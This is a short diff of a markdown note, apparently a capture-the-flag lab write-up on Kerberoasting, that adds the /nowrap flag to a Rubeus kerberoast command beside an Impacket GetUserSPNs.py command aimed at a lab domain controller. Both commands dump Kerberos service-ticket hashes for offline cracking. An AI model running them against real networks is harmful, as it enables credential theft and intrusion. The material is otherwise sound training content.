@@ -30,7 +30,7 @@ GetUserSPNs.py -dc-ip 10.10.73.127 THM.red/thm -request-user svc-user
 This will dump the Kerberos hash of any kerberoastable users.
  > If the service has a registered SPN then it can be Kerberoastable 
 ```
-Rubeus.exe kerberoast
+Rubeus.exe kerberoast /nowrap
 ```
 the output look like this:
 ```
